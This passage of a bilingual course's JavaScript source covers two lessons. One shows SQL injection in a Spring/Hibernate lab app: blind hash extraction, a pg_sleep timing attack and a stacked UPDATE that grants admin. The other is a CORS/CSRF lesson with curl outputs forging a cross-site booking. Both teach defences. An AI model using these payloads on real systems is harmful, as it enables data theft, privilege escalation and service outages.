<p>483 request, 6 giây, đủ cả chuỗi băm 68 ký tự, trùng khớp CSDL. Đó là SQL injection <em>mù</em>: kẻ tấn công không bao giờ thấy dữ liệu, chỉ thấy tín hiệu có/không, mà vẫn đọc được tất cả. Chuỗi băm sau đó đem đi bẻ ngoại tuyến (bài 9.2).</p>

<h3>Thí nghiệm 4: khi không có cả tín hiệu có/không — dùng thời gian</h3>
${OUT103_NGU}
<p><code>function('pg_sleep', 2)</code> chỉ được tính khi điều kiện đúng, nên thời gian phản hồi chính là tín hiệu: 2,04 giây nghĩa là "có". Bỏ chốt <code>b.id = 1</code> đi thì lệnh ngủ chạy một lần cho MỖI dòng: cùng request đó với 30 dòng đo được <strong>60,07 giây</strong>. Vài request như vậy chiếm hết kết nối CSDL trong pool — injection còn là công cụ đánh sập dịch vụ.</p>

<h3>Thí nghiệm 5: native query, ORDER BY, và một lỗi 500 vẫn đổi dữ liệu</h3>
${OUT103_NATIVE}
<ul>
  <li>Tham số sắp xếp nhận cả một biểu thức SQL: một <code>CASE</code> có truy vấn con vào <code>accounts</code> ngủ 2 giây khi chuỗi băm admin bắt đầu bằng <code>{bcrypt}</code>. Cùng kỹ thuật mù, giờ trong SQL gốc.</li>
  <li>Request cuối nối thêm <code>; update accounts set role = 'ADMIN' …</code>. Driver JDBC của PostgreSQL gửi cả hai câu; sau đó truy vấn lỗi "Multiple ResultSets were returned", người dùng thấy 500. Nhưng phương thức không có giao dịch, nên kết nối đang ở chế độ tự commit và câu <code>UPDATE</code> đã được commit: <strong>Lan là ADMIN</strong>. Phản hồi lỗi không chứng minh rằng không có gì xảy ra.</li>
  <li>Tài khoản CSDL chỉ có quyền DML (bài 8.3) chặn được <code>DROP TABLE</code>, không chặn <code>UPDATE</code>. Quyền tối thiểu giới hạn thiệt hại; nó không thay được tham số.</li>
</ul>

<h3>Cách vá: giá trị là tham số, định danh đi qua danh sách cho phép</h3>
${MA103_DUNG}
${OUT103_DUNG}
<ul>
  <li>Giá trị (<code>:me</code>, <code>:st</code>) được bind: driver gửi chúng TÁCH khỏi chữ của câu truy vấn, nên dấu nháy chỉ là một ký tự trong chuỗi. Ở đây <code>status</code> còn được so với ba giá trị hợp lệ trước, nên lần dò thành một lỗi 400 rõ ràng.</li>
  <li>Định danh không bind được, nên client chọn một <em>khoá</em> (<code>start</code>, <code>lab</code>, <code>status</code>) và server ánh xạ sang tên cột do chính nó viết. Khác những khoá đó: 400. Hướng sắp xếp chỉ được đúng <code>asc</code> hoặc <code>desc</code>.</li>
  <li>Bộ lọc động nhiều trường tuỳ chọn thì dùng Criteria API hoặc Specification của Spring Data thay vì ghép chuỗi — cùng nguyên tắc, không nối chuỗi.</li>
</ul>

<h3>Còn Sort của Spring Data lấy từ URL thì sao?</h3>
${OUT103_DATA}
<ul>
  <li>Spring Data JPA từ chối biểu thức: <code>(select 1)</code> bị chặn với "Sort expression … must only contain property references" (lớp bảo vệ thêm sau CVE-2016-6652, bài 6.4). Thuộc tính lạ lỗi <code>UnknownPathException</code>.</li>
  <li>Cả hai thành 500 nếu bạn không ánh xạ lỗi; một API nên trả 400. Và <code>student.email</code> được chấp nhận — sắp theo một trường mà phản hồi còn không chứa. Danh sách khoá sắp xếp cho phép vẫn là lời giải gọn.</li>
</ul>

<h3>🕵️ Góc hacker — MOVEit Transfer 2023</h3>
<p>Ngày 27/5/2023 nhóm ransomware Cl0p bắt đầu khai thác CVE-2023-34362, một lỗi SQL injection trong ứng dụng web của Progress MOVEit Transfer, sản phẩm truyền tệp được chính phủ, ngân hàng và trường đại học dùng. Qua nó, chúng chạm tới CSDL, cài một web shell và tải về các tệp mà các tổ chức đang trao đổi. Chỉ trong vài tuần, hơn 2.000 tổ chức và hàng chục triệu người bị ảnh hưởng, gồm các công ty trả lương, hãng hàng không và cơ quan liên bang Mỹ. Một câu truy vấn nối chuỗi trong một sản phẩm trở thành sự cố chuỗi cung ứng.</p>
<p><strong>Bạn làm gì:</strong> tham số cho MỌI giá trị (JPQL <code>:name</code>, native <code>?</code>/<code>:name</code>, <code>JdbcClient.param</code>); danh sách cho phép cho tên cột, hướng sắp xếp, tên bảng; kiểm giá trị enum; <code>@Transactional</code> trên thao tác ghi để request lỗi được rollback; quyền CSDL tối thiểu; không bao giờ trả thông báo exception cho client; grep cả dự án tìm <code>createQuery(</code> và <code>createNativeQuery(</code> có dấu <code>+</code> gần đó.</p>

<h3>So với Node.js</h3>
${MA103_NODE}
${OUT103_NODE}
<p>Cùng lỗi, cùng cách vá, cùng giới hạn: <code>pg</code> bind giá trị bằng <code>$1</code>, nhưng <code>ORDER BY $1</code> sắp theo một hằng số (câu chạy và không sắp gì). <code>$queryRaw</code> dạng tagged template của Prisma bind giá trị; <code>$queryRawUnsafe</code> chính là bản nối chuỗi ở trên. Tên cột cần danh sách cho phép ở mọi ngôn ngữ.</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li>Trang tìm kiếm của admin là nơi nối chuỗi còn sống dai nhất: "lọc theo cột bất kỳ", "sắp theo tiêu đề bất kỳ". Đó cũng là trang có tài khoản quyền lực nhất đứng sau.</li>
  <li>Log in SQL kèm giá trị viết thẳng vào câu trở thành chỗ lộ thứ hai (mật khẩu trong <code>WHERE</code>?). Ghi tham số riêng hoặc đừng ghi.</li>
  <li>Phân tích tĩnh (SpotBugs + Find Security Bugs, Semgrep, CodeQL) bắt được truy vấn ghép chuỗi; chạy nó trong CI (Chương 17).</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"JPA/Hibernate có chống SQL injection không?"</strong> — Chỉ khi bạn dùng tham số. JPQL nối chuỗi vẫn bị tiêm; nó đọc được mọi entity, gọi được hàm CSDL và, với native query, chạy thêm câu lệnh.</li>
  <li><strong>"Làm ORDER BY động an toàn thế nào?"</strong> — Ánh xạ khoá của client sang cột do server viết (danh sách cho phép), hướng chỉ asc/desc, hoặc <code>Sort</code> của Spring Data kèm danh sách cho phép và trả 400 khi lỗi.</li>
  <li><strong>"Blind SQL injection là gì?"</strong> — Rút dữ liệu qua tín hiệu có/không (có dòng/không dòng) hoặc thời gian, mỗi request một câu hỏi; ở đây 483 request đọc được chuỗi băm 68 ký tự.</li>
  <li><strong>"Request lỗi 500. Vậy là tấn công thất bại?"</strong> — Chưa chắc: ở chế độ tự commit, câu <code>UPDATE</code> bị tiêm đã commit trước khi lỗi. Dùng giao dịch và kiểm dữ liệu.</li>
  <li><strong>"PreparedStatement khác Statement?"</strong> — PreparedStatement gửi tham số tách khỏi chữ SQL (và tái dùng được kế hoạch thực thi); Statement nối chuỗi.</li>
</ol>

<h3>🧪 Thực hành (25 phút)</h3>
<div class="callout ok"><ol>
  <li>Với <code>/v0/bookings/search</code> dưới vai Lan, đoán kết quả của: <code>status=PENDING</code>, <code>status=PENDING' or '1'='1</code>, <code>status=PENDING'</code>, <code>status=PEN'DING</code>.</li>
  <li>Đoán thời gian phản hồi của <code>status=x' or (b.id = 1 and function('pg_sleep', 2) is null) or 'a'='b</code>, và của cùng request khi bỏ <code>b.id = 1 and</code>.</li>
  <li>Giải thích trong hai câu vì sao <code>role</code> thành ADMIN dù request nối câu lệnh trả 500.</li>
  <li>Đoán mã trạng thái của <code>/bookings/search</code> với <code>status=PENDING</code> và <code>sort=(select 1)</code>.</li>
</ol>
<p><strong>Đạt khi:</strong> câu trả lời khớp output (1 dòng, 30 dòng, 200 kèm lượt của Lan, 500), thời gian khoảng 2 giây và khoảng 60 giây (30 dòng × 2 giây), lời giải thích có nhắc tự commit, và bạn đoán 400 kèm danh sách khoá sắp xếp cho phép.</p></div>
${giai('Xem đáp án', `<p>1 dòng; 30 dòng của 25 sinh viên; 200 và đúng lượt PENDING của Lan (bộ tách từ bỏ dấu nháy thừa); 500 (<code>SyntaxException</code> trong log). Thời gian: 2,04 giây khi có chốt, 60,07 giây khi không (đo thật). Driver chạy cả hai câu; không có <code>@Transactional</code> thì mỗi câu tự commit, nên <code>UPDATE</code> đã vĩnh viễn trước khi lỗi "Multiple ResultSets". <code>sort=(select 1)</code> ⇒ 400 "sort phải là một trong [start, status, lab]".</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Injection</span><span class="v">Đầu vào không tin cậy bị hiểu thành một phần của câu truy vấn hay lệnh, thay vì là dữ liệu.</span></div>
  <div class="kv"><span class="k">JPQL / HQL</span><span class="v">Ngôn ngữ truy vấn đối tượng của JPA và Hibernate; được phân tích rồi dịch sang SQL.</span></div>
  <div class="kv"><span class="k">Tham số bind</span><span class="v">Chỗ giữ chỗ (<code>:name</code>, <code>?</code>, <code>$1</code>) mà giá trị được gửi tách khỏi chữ của câu truy vấn.</span></div>
  <div class="kv"><span class="k">Injection mù</span><span class="v">Rút dữ liệu qua tín hiệu đúng/sai hoặc thời gian, không qua thân phản hồi.</span></div>
  <div class="kv"><span class="k">Câu lệnh chồng (stacked query)</span><span class="v">Câu lệnh thứ hai nối sau dấu <code>;</code> trong cùng một chuỗi truy vấn.</span></div>
  <div class="kv"><span class="k">Tự commit (auto-commit)</span><span class="v">Mỗi câu lệnh commit ngay khi không có giao dịch nào đang mở.</span></div>
  <div class="kv"><span class="k">Danh sách định danh cho phép</span><span class="v">Client chọn một khoá; server ánh xạ sang tên cột do nó viết.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>JPQL nối chuỗi lộ 30 dòng chỉ với một dấu nháy, và cả chuỗi băm mật khẩu sau 483 request có/không (6 giây).</li>
  <li><code>function('pg_sleep', …)</code> cho một "đồng hồ" để dò và một lần đánh sập 60 giây.</li>
  <li>Nối chuỗi vào <code>ORDER BY</code> của native query đã chạy một câu <code>UPDATE</code> và commit dù phản hồi là 500.</li>
  <li>Giá trị: luôn là tham số. Định danh: danh sách cho phép. Thao tác ghi: trong giao dịch.</li>
  <li>Sort của Spring Data chặn biểu thức nhưng vẫn cần danh sách cho phép và xử lý thành 400.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html', '📋', 'OWASP SQL Injection Prevention Cheat Sheet', 'Tham số, danh sách cho phép, quyền tối thiểu.')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html', '📋', 'OWASP Query Parameterization Cheat Sheet', 'Có ví dụ JPA và Hibernate.')}
${tl('https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a', '🏛️', 'CISA AA23-158A — Cl0p khai thác MOVEit (CVE-2023-34362)', 'Chiến dịch 2023 diễn ra thế nào, từng bước.')}
${tl('https://docs.jboss.org/hibernate/orm/6.6/querylanguage/html_single/Hibernate_Query_Language.html', '🍃', 'Hướng dẫn Hibernate Query Language', 'HQL gọi được gì: hàm, truy vấn con, mọi entity.')}

<h3>Nguồn</h3>
<ul>
  <li>Output trong bài: <code>labflow.DemoApp</code> (<code>V0Booking</code>, <code>TimKiem</code>), <code>t/rut.sh</code> ở <code>lab/c10</code>, Spring Boot 4.1.2, Hibernate 7.4.13.Final, PostgreSQL JDBC 42.7.14, PostgreSQL 16.15; Node 22 + pg (20/11/2026).</li>
  <li>Khuyến cáo CISA AA23-158A, 7/6/2023; bản tin bảo mật của Progress cho CVE-2023-34362.</li>
</ul>
</div>
`;

// ===== Bài 10.4 =====
const MA104_CHAIN = java("// trong SecurityFilterChain chain(HttpSecurity http, …)\nif (csrf.equals(\"spa\")) http.csrf(c -> c.spa()); else http.csrf(c -> c.disable());\nif (!cors.equals(\"none\")) http.cors(Customizer.withDefaults());");
const MA104_CORS = java("@Bean\nCorsConfigurationSource corsConfigurationSource(@Value(\"${c10.cors:none}\") String cors) {\n    CorsConfiguration c = new CorsConfiguration();\n    switch (cors) {\n        case \"sao\" -> c.addAllowedOrigin(\"*\");\n        case \"mau\" -> c.addAllowedOriginPattern(\"*\");\n        default -> c.setAllowedOrigins(List.of(\"https://labflow.vn\", \"http://localhost:5173\"));\n    }\n    c.setAllowedMethods(List.of(\"GET\", \"POST\", \"PATCH\", \"DELETE\"));\n    c.setAllowedHeaders(List.of(\"Authorization\", \"Content-Type\", \"X-XSRF-TOKEN\"));\n    c.setAllowCredentials(true);\n    c.setMaxAge(Duration.ofHours(1));\n    UrlBasedCorsConfigurationSource s = new UrlBasedCorsConfigurationSource();\n    s.registerCorsConfiguration(\"/**\", c);\n    return s;\n}");
const OUT104_NONE = out("########## c10.cors=none\n$ curl -i -X OPTIONS /bookings -H \"Origin: https://labflow.vn\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: authorization,content-type\"\nHTTP/1.1 401 \n$ curl -i -X OPTIONS /bookings -H \"Origin: https://evil.example\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: authorization,content-type\"\nHTTP/1.1 401 \n$ curl -i /labs -H \"Origin: https://evil.example\"\nHTTP/1.1 200 ");
const OUT104_DUNG = out("########## c10.cors=dung\n$ curl -i -X OPTIONS /bookings -H \"Origin: https://labflow.vn\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: authorization,content-type\"\nHTTP/1.1 200 \nVary: Origin\nVary: Access-Control-Request-Method\nVary: Access-Control-Request-Headers\nAccess-Control-Allow-Origin: https://labflow.vn\nAccess-Control-Allow-Methods: GET,POST,PATCH,DELETE\nAccess-Control-Allow-Headers: authorization, content-type\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 3600\n$ curl -i -X OPTIONS /bookings -H \"Origin: https://evil.example\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: authorization,content-type\"\nHTTP/1.1 403 \nVary: Origin\nVary: Access-Control-Request-Method\nVary: Access-Control-Request-Headers\nInvalid CORS request\n$ curl -i /labs -H \"Origin: https://evil.example\"\nHTTP/1.1 403 \nInvalid CORS request");
const OUT104_SAO = out("########## c10.cors=sao\n$ curl -i -X OPTIONS /bookings -H \"Origin: https://labflow.vn\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: authorization,content-type\"\nHTTP/1.1 500 \nVary: Origin\nVary: Access-Control-Request-Method\nVary: Access-Control-Request-Headers\n$ curl -i -X OPTIONS /bookings -H \"Origin: https://evil.example\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: authorization,content-type\"\nHTTP/1.1 500 \nVary: Origin\nVary: Access-Control-Request-Method\nVary: Access-Control-Request-Headers\n$ curl -i /labs -H \"Origin: https://evil.example\"\nHTTP/1.1 500 \nIllegalArgumentException: When allowCredentials is true, allowedOrigins cannot contain the special value \"*\" since that cannot be set on the \"Access-Control-Allow-Origin\" response header. To allow credentials to a set of origins, list them explici");
const OUT104_MAU = out("########## c10.cors=mau\n$ curl -i -X OPTIONS /bookings -H \"Origin: https://labflow.vn\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: authorization,content-type\"\nHTTP/1.1 200 \nVary: Origin\nVary: Access-Control-Request-Method\nVary: Access-Control-Request-Headers\nAccess-Control-Allow-Origin: https://labflow.vn\nAccess-Control-Allow-Methods: GET,POST,PATCH,DELETE\nAccess-Control-Allow-Headers: authorization, content-type\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 3600\n$ curl -i -X OPTIONS /bookings -H \"Origin: https://evil.example\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: authorization,content-type\"\nHTTP/1.1 200 \nVary: Origin\nVary: Access-Control-Request-Method\nVary: Access-Control-Request-Headers\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Methods: GET,POST,PATCH,DELETE\nAccess-Control-Allow-Headers: authorization, content-type\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 3600\n$ curl -i /labs -H \"Origin: https://evil.example\"\nHTTP/1.1 200 \nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true");
const MA104_COOKIE = java("@Bean\nBearerTokenResolver bearerTokenResolver(@Value(\"${c10.cookie:false}\") boolean cookie) {\n    DefaultBearerTokenResolver header = new DefaultBearerTokenResolver();\n    if (!cookie) return header;\n    return (HttpServletRequest r) -> {\n        String t = header.resolve(r);\n        if (t != null) return t;\n        var c = WebUtils.getCookie(r, \"at\");\n        return c == null ? null : c.getValue();\n    };\n}");
const OUT104_A = out("########## A. JWT trong cookie \"at\" (BearerTokenResolver đọc cookie), c10.csrf=off\n# Trang https://evil.example tự gửi form tới API; trình duyệt TỰ đính cookie at — không có header Authorization\n$ curl -X POST /bookings -H \"Origin: https://evil.example\" -H \"Cookie: at=$LAN\" -d '{\"labCode\":\"AI-03\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-04-01T08:00:00\",\"endAt\":\"2030-04-01T09:00:00\"}'\n{\"id\":41,\"labCode\":\"AI-03\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-04-01T08:00:00\",\"endAt\":\"2030-04-01T09:00:00\",\"status\":\"PENDING\",\"version\":0}\nHTTP 201");
const OUT104_B = out("########## B. Vẫn cookie \"at\", BẬT CSRF: http.csrf(c -> c.spa())\n# Bật CSRF thì cả /auth/login cũng cần token CSRF\n$ curl -X POST /auth/login -d '{\"username\":\"SE180123\",\"password\":\"$MAT_KHAU_LAN\"}'\n{\"timestamp\":\"2026-11-20T03:13:45.770Z\",\"status\":403,\"error\":\"Forbidden\",\"path\":\"/auth/login\"}\nHTTP 403\n$ curl -i /labs   (lần GET đầu tiên của trang)\nSet-Cookie: XSRF-TOKEN=06b94f21-cc4e-4816-a8c2-c897a9eef19f; Path=/\n$ curl -X POST /auth/login -H \"Cookie: XSRF-TOKEN=$X\" -H \"X-XSRF-TOKEN: $X\" -d '{...}'   ⇒ có access token: eyJhbGciOiJIUzI1…\n# Trang độc gửi lại đúng request của A (không có header X-XSRF-TOKEN)\n$ curl -X POST /bookings -H \"Origin: https://evil.example\" -H \"Cookie: at=$LAN\" -d '{\"labCode\":\"AI-03\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-04-02T08:00:00\",\"endAt\":\"2030-04-02T09:00:00\"}'\n{\"id\":42,\"labCode\":\"AI-03\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-04-02T08:00:00\",\"endAt\":\"2030-04-02T09:00:00\",\"status\":\"PENDING\",\"version\":0}\nHTTP 201\n$ docker logs … | grep CsrfFilter\nDid not protect against CSRF since request did not match And [IsNotHttpMethod [TRACE, HEAD, GET, OPTIONS], Not [Or [OAuth2ResourceServerConfigurer$BearerTokenRequestMatcher]]]");
const OUT104_C = out("########## C. JWT CHỈ trong header Authorization (mặc định), c10.csrf=off\n$ curl -X POST /bookings -H \"Origin: https://evil.example\" -H \"Cookie: at=$LAN\" -d '{\"labCode\":\"AI-03\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-04-03T08:00:00\",\"endAt\":\"2030-04-03T09:00:00\"}'\n\nHTTP 401\n$ curl -X POST /bookings -H \"Authorization: Bearer $LAN\" -d '{\"labCode\":\"AI-03\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-04-04T08:00:00\",\"endAt\":\"2030-04-04T09:00:00\"}'\n{\"id\":43,\"labCode\":\"AI-03\",\"studentCode\":\"SE180123\",\"startAt\":\"2030-04-04T08:00:00\",\"endAt\":\"2030-04-04T09:00:00\",\"status\":\"PENDING\",\"version\":0}\nHTTP 201");

const L104_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · Lesson 10.4</span>
<h2>CORS and CSRF for a JWT API</h2>
<p class="lead">CORS and CSRF are the two browser topics every backend interview touches and most projects configure by copying a snippet until the red text in the console disappears. Both are about the same actor — the victim's own browser, visiting a page the attacker controls. In this lesson we read real preflight responses for four CORS configurations (one of them crashes every request, one of them is dangerous and looks perfect), then forge a cross-site booking and watch Spring Security's CSRF protection switch itself off because of one innocent-looking bean.</p>

<h3>In everyday life first</h3>
<p><strong>CORS.</strong> A courier from company X wants to take a parcel up to LabFlow's office. The receptionist (the browser) phones upstairs first: "Do you accept couriers sent by company X, carrying this kind of parcel?" That phone call is the <em>preflight</em>. If upstairs says no, the courier waits in the lobby. The receptionist protects the <em>visitor's own bag</em> — your cookies and the answers you can read — not the office: anyone can still walk to the office through the back door (curl, Postman, a server).</p>
<p><strong>CSRF.</strong> Someone slips a filled-in order form into your out-tray. Your assistant stamps every form in the tray with your company seal and posts it. The seal is your cookie, added automatically by the browser to every request to that site — even when the request was started by another page. Cross-Site Request Forgery is getting your browser to send a request you never meant to send, with your credentials attached.</p>

<h3>Origins and preflight in one paragraph</h3>
<p>An <em>origin</em> is scheme + host + port: <code>https://labflow.vn</code> and <code>https://api.labflow.vn</code> are different origins. By the same-origin policy, JavaScript on one origin may send requests to another but may not <em>read</em> the response unless the server answers with <code>Access-Control-Allow-Origin</code>. For requests that are not "simple" — an <code>Authorization</code> header, <code>Content-Type: application/json</code>, <code>PATCH</code> — the browser first sends <code>OPTIONS</code> with <code>Origin</code>, <code>Access-Control-Request-Method</code> and <code>Access-Control-Request-Headers</code>, and only sends the real request if the answer allows it. Our React frontend calling LabFlow with a JWT triggers a preflight on every new endpoint.</p>

<h3>The configuration we will switch</h3>
${MA104_CHAIN}
${MA104_CORS}

<h3>Experiment 1: no CORS configuration</h3>
${OUT104_NONE}
<ul>
  <li>The preflight goes through the security filter chain like any request, has no token, and gets <strong>401</strong>. The browser reports "CORS error", and the developer starts adding <code>@CrossOrigin</code> everywhere — the real cause is that Spring Security never learned about CORS.</li>
  <li>The public <code>GET /labs</code> from <code>https://evil.example</code> answers 200 without <code>Access-Control-Allow-Origin</code>. The request <em>reached</em> the server; the browser simply refuses to hand the body to the page. CORS is not a firewall.</li>
</ul>

<h3>Experiment 2: an explicit list of origins (the right one)</h3>
${OUT104_DUNG}
<ul>
  <li><code>http.cors()</code> puts a <code>CorsFilter</code> before authentication, so the preflight is answered without a token: 200, the origin echoed exactly, methods, headers, credentials and a 1-hour cache (<code>Max-Age</code>).</li>
  <li>An unknown origin gets 403 "Invalid CORS request" — for the preflight and for the actual request, even on the public <code>/labs</code>.</li>
  <li><code>Vary: Origin</code> tells caches and CDNs that the answer depends on the origin; without it a cache could serve one site's CORS answer to another.</li>
</ul>

<h3>Experiment 3: "allow everything" — <code>*</code> with credentials</h3>
${OUT104_SAO}
<p>Every request, including the public <code>/labs</code>, answers <strong>500</strong>. Spring refuses the combination because browsers forbid it too (a wildcard origin may not be used with credentials). Note <em>when</em> it fails: at request time, not at startup. The application starts, health checks may pass, and every page is broken.</p>

<h3>Experiment 4: the dangerous one — a pattern <code>*</code> with credentials</h3>
${OUT104_MAU}
<p>Swap <code>addAllowedOrigin("*")</code> for <code>addAllowedOriginPattern("*")</code> and the 500 disappears — which is why this line is popular on StackOverflow. What it actually does: echo <em>any</em> origin, including <code>https://evil.example</code>, together with <code>Access-Control-Allow-Credentials: true</code>. If the API accepted cookies, a page on any site could call it with the victim's cookies and <em>read</em> the answers. The response looks exactly like experiment 2. Only the origin in it is wrong.</p>
<p>Rule of thumb: list origins explicitly (from configuration, per environment). Patterns are for subdomains you own — <code>https://*.labflow.vn</code>, with the dot — and Lab 10 grades the trap without the dot.</p>

<h3>CSRF: does a JWT API need it?</h3>
<p>CSRF works only when the browser attaches the credential by itself. A JWT that the frontend keeps in memory and sends in the <code>Authorization</code> header is never attached automatically. A JWT kept in a cookie is. To compare, the demo can read the access token from a cookie <code>at</code> as well:</p>
${MA104_COOKIE}

<h3>Experiment 5: a forged booking, with and without CSRF protection</h3>
<p>A: token accepted from the cookie, CSRF disabled (the usual JWT setup). A page on <code>https://evil.example</code> submits a booking; the browser adds the cookie:</p>
${OUT104_A}
<p>201 — a booking in Lan's name that she never made. B: same cookie setup, now with <code>http.csrf(c -&gt; c.spa())</code> (Spring Security 7's preset for single-page apps: token in a readable <code>XSRF-TOKEN</code> cookie, sent back in the <code>X-XSRF-TOKEN</code> header):</p>
${OUT104_B}
<ul>
  <li>CSRF is on: even <code>POST /auth/login</code> now needs the token (403, then 200 with it). The SPA must GET a page first to receive <code>XSRF-TOKEN</code>.</li>
  <li>And yet the forged booking <strong>still succeeded (201)</strong>. The trace line explains it: the OAuth2 resource server tells <code>CsrfFilter</code> to ignore every request matched by <code>BearerTokenRequestMatcher</code> — "requests that carry a bearer token cannot be CSRF". That matcher asks <em>our</em> resolver, and our resolver says the cookie is a bearer token. CSRF protection was switched off for exactly the requests it should protect, without a warning.</li>
</ul>
<p>C: the default resolver (header only), CSRF disabled:</p>
${OUT104_C}
<p>The forged request with only the cookie is now just an anonymous request: 401. The real client, which sends <code>Authorization: Bearer</code>, works. No CSRF token needed, because nothing is sent automatically.</p>

<h3>So what should LabFlow do?</h3>
<ul>
  <li><strong>Browser SPA + JWT API:</strong> access token in memory, sent in the header; CSRF disabled; CORS with an explicit origin list. This is Lab 9's design.</li>
  <li>The refresh token from lesson 9.5 is a cookie, so it is reachable by CSRF. It is <code>HttpOnly</code>, <code>SameSite=Strict</code> and limited to <code>Path=/auth</code>; a forged <code>/auth/refresh</code> can only rotate the token, and the new access token is in a response body the attacker's page cannot read (CORS).</li>
  <li><strong>If you want cookies for everything</strong> (no token in JavaScript), use a server session or a backend-for-frontend with Spring Security's normal CSRF protection — not a custom <code>BearerTokenResolver</code> that reads cookies.</li>
  <li><code>SameSite=Lax</code> (the browser default for cookies without the attribute in Chrome since 2020) blocks most cross-site form posts. It does not help against a sibling subdomain like <code>evil.labflow.vn</code>, which counts as the same site.</li>
</ul>

<h3>🕵️ Hacker corner — CORS for bitcoins (2016) and CSRF at a bank (2008)</h3>
<p><strong>2016.</strong> James Kettle of PortSwigger presented "Exploiting CORS misconfigurations for Bitcoins and bounties". He found bitcoin exchanges whose APIs reflected any <code>Origin</code> with credentials allowed — experiment 4. A page on any site could call the exchange's API with the visitor's session and read the answers, including the user's API keys, which were enough to move funds. The fix was the one above: an explicit list of origins.</p>
<p><strong>2008.</strong> William Zeller and Edward Felten (Princeton) published CSRF attacks against major sites. On ING Direct, a page the victim merely visited could open a new payee and transfer money out of the victim's account, because the bank's forms relied only on the session cookie. They also showed CSRF on YouTube, The New York Times and MetaFilter. The fix: a per-session secret token that a foreign page cannot read.</p>
<p><strong>What you do:</strong> exact origins per environment; never <code>allowedOriginPatterns("*")</code> with credentials; tokens in headers for APIs; if cookies carry authentication, real CSRF protection and <code>SameSite</code>; test preflights with curl from an unknown origin in CI.</p>

<h3>Compared with Node.js</h3>
<p>The Express <code>cors</code> package has the same traps under other names: <code>cors({ origin: true, credentials: true })</code> reflects the request's origin, which is experiment 4. An explicit array of origins is the fix. For CSRF, the old <code>csurf</code> middleware was deprecated in 2022; the current advice is <code>SameSite</code> cookies plus a double-submit token library, or tokens in headers. Same reasoning as Spring: no automatic credential, no CSRF.</p>

<h3>In real life and at work</h3>
<ul>
  <li>Separate CORS lists per environment: <code>http://localhost:5173</code> belongs in dev, not in production.</li>
  <li>"CORS error" in the console often hides a 401, 403 or 500 on the preflight. Reproduce it with <code>curl -i -X OPTIONS</code> and read the status first.</li>
  <li>Mobile apps and server-to-server calls do not use CORS at all; only browsers do.</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"What is a preflight request?"</strong> — An <code>OPTIONS</code> request the browser sends before a non-simple cross-origin request, asking whether the method, headers and origin are allowed.</li>
  <li><strong>"Does CORS protect my API?"</strong> — No. It protects users' browsers from pages that try to read responses with their credentials; curl ignores it.</li>
  <li><strong>"Why can't allowedOrigins be * with credentials?"</strong> — Browsers forbid it; Spring throws. The workaround <code>allowedOriginPatterns("*")</code> reflects every origin and is worse.</li>
  <li><strong>"Do you need CSRF protection with JWT?"</strong> — Not when the token is sent in the <code>Authorization</code> header; yes when the token or session is in a cookie.</li>
  <li><strong>"What does SameSite do?"</strong> — Tells the browser not to send the cookie on cross-site requests (Strict) or on cross-site subrequests and POSTs (Lax). A strong layer, not a complete CSRF defence.</li>
</ol>

<h3>🧪 Practice (20 minutes)</h3>
<div class="callout ok"><ol>
  <li>For each configuration (none, dung, sao, mau), predict the status of the preflight from <code>https://evil.example</code> and whether the answer carries <code>Access-Control-Allow-Origin</code>.</li>
  <li>Explain why <code>GET /labs</code> from <code>https://evil.example</code> answered 200 in configuration "none" but 403 in "dung".</li>
  <li>In experiment 5B, CSRF was enabled and the forged booking still returned 201. Name the matcher responsible and say what change made it apply to the cookie.</li>
</ol>
<p><strong>Done when:</strong> your four predictions match the outputs, your answer to 2 says that CORS processing happens only when a CORS configuration exists, and your answer to 3 names <code>BearerTokenRequestMatcher</code> and the cookie-reading <code>BearerTokenResolver</code>.</p></div>
${giai('Show the answers', `<p>none: 401, no header. dung: 403 "Invalid CORS request", no header. sao: 500 (the IllegalArgumentException), no header. mau: 200 with <code>Access-Control-Allow-Origin: https://evil.example</code> and credentials true. Without <code>http.cors()</code> there is no <code>CorsFilter</code>, so the origin is not checked at all and the public route answers normally (the browser would still hide the body); with the explicit list the filter rejects the unknown origin. The resource server registers <code>BearerTokenRequestMatcher</code> as a CSRF ignore rule; it uses the configured <code>BearerTokenResolver</code>, and our resolver returned the cookie <code>at</code>.</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Origin</span><span class="v">Scheme + host + port of a page or request.</span></div>
  <div class="kv"><span class="k">Same-origin policy</span><span class="v">Browser rule: a page may not read responses from another origin unless allowed.</span></div>
  <div class="kv"><span class="k">CORS</span><span class="v">Cross-Origin Resource Sharing: response headers that relax the same-origin policy.</span></div>
  <div class="kv"><span class="k">Preflight</span><span class="v"><code>OPTIONS</code> request sent before a non-simple cross-origin request.</span></div>
